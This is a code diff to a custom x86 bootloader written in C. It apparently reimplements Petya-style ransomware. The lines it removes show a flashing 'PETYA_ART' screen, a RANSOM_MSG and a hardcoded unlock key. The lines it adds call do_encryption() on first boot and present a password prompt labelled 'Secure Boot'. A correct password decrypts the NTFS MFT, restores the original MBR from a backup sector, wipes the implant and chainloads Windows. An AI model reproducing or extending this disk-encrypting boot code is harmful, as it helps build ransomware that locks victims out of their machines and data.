@@ -359,63 +359,107 @@ halt:
 
 void login(void)
 {
+    vga_clear();
 
+    vga_set_color(COLOR_WHITE_ON_BLUE);
+    vga_puts("Secure Boot");
+    vga_puts("\n\n");
+
+    vga_set_color(COLOR_WHITE_ON_BLACK);
+
+    char input[MAX_PW_LEN];
+    int attempts = 0;
+
+    while (attempts < MAX_ATTEMPTS)
+    {
+        vga_set_color(COLOR_YELLOW_ON_BLACK);
+        vga_puts("Attempts remaining: ");
+        vga_put_dec(MAX_ATTEMPTS - attempts);
+        vga_putchar('\n');
+
+        vga_puts("Password: ");
+        keyboard_readline(input, MAX_PW_LEN);
+
+        if (ntfs_mft_decrypt(input, PARTITION_LBA) == 0)
+        {
+            zero_buffer(input, MAX_PW_LEN);
+
+            vga_set_color(COLOR_GREEN_ON_BLACK);
+            vga_puts("\nAccess granted!\n\n");
+            vga_set_color(COLOR_WHITE_ON_BLACK);
+
+            uint64_t disk_size = state_read_disk_size();
+            hidden_store_init(disk_size);
+
+            vga_puts("[1/4] Restoring original MFT...\n");
+            if (hidden_restore_mft(PARTITION_LBA) != 0)
+            {
+                vga_set_color(COLOR_RED_ON_BLACK);
+                vga_puts("ERROR: MFT restore failed!\n");
+                vga_puts("System halted to prevent data loss.\n");
+
+                __asm__ volatile ("cli\n.Lhalt2: hlt\njmp .Lhalt2\n");
+                __builtin_unreachable();
+            }
+
+            vga_puts("[2/4] Restoring original MBR...\n");
+            uint8_t mbr_buffer[512];
+            if (ata_read(63, 1, mbr_buffer) == 0)
+            {
+                uint8_t current[512]; // current partition table
+                ata_read(0, 1, current);
+
+                for (int i = 0; i < 446; i++)
+                    current[i] = mbr_buffer[i];
+
+                current[510] = 0x55;
+                current[511] = 0xAA;
+
+                ata_write(0, 1, current);
+                vga_puts("Original MBR was restored.\n");
+            }
+            else
+            {
+                vga_puts("Warning: Could not read MBR backup.\n");
+            }
+
+            vga_puts("[3/4] Removing custom bootloader...\n");
+            wipe_out_bootloader();
+            hidden_wipe();
+
+            uint32_t zero[512] = { 0 };
+            ata_write(63, 1, zero);
+
+            vga_set_color(COLOR_GREEN_ON_BLACK);
+            vga_puts("\n[4/4] Booting Windows...\n");
+            vga_puts("Custom bootloader has been removed.\n");
+
+            sleep(3000);
+
+            do_chainload();
+        }
+
+        zero_buffer(input, MAX_PW_LEN);
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("Wrong pasword.\n\n");
+        vga_set_color(COLOR_WHITE_ON_BLACK);
+
+        attempts++;
+    }
 }
 
 void bootloader_main(uint32_t boot_drive)
 {
-    int flag = 0;
-    while (1)
-    {
-        vga_clear();
-
-        vga_set_color(flag == 0 ? COLOR_WHITE_ON_BLACK : COLOR_WHITE_ON_RED);
-        flag = flag == 0 ? 1 : 0;
-
-        //vga_draw_centered_ascii("NiHaHaHaHa!\n(Press any key to resume)");
-        vga_puts(PETYA_ART);
-
-        if (keyboard_hashkey())
-            break;
-
-        //for (int i = 0; i < 1000000; i++);
-        sleep(100);
-    }
+    (void)boot_drive;
 
     vga_clear();
+    vga_puts("HI");
 
-    vga_set_color(COLOR_RED_ON_BLACK);
-    vga_puts(RANSOM_MSG);
+    uint8_t s = state_read();
+    if (s == STATE_NOT_SETUP)
+        do_encryption();
+    else
+        login();
 
-    const char *petya_key = "123456";
-
-    keyboard_getchar();
-
-    while (1)
-    {
-        vga_putchar('\n');
-        vga_puts("Enter key: ");
-        char key[64];
-
-        keyboard_readline(key, sizeof(key));
-
-        if (strcmp(key, petya_key) == 0)
-        {
-            vga_puts("YES!");
-            
-            for (volatile int i = 0; i < 3000000; i++);
-
-            vga_clear();
-
-            vga_set_color(COLOR_WHITE_ON_BLACK);
-            do_chainload();
-        }
-
-        vga_puts("GO AWAY!\n\n");
-    }
-
-    ntfs_read_mft(2048);
-
-    __asm__ volatile ("cli\n.Lhang: hlt\njmp .Lhang\n");
     __builtin_unreachable();
 }
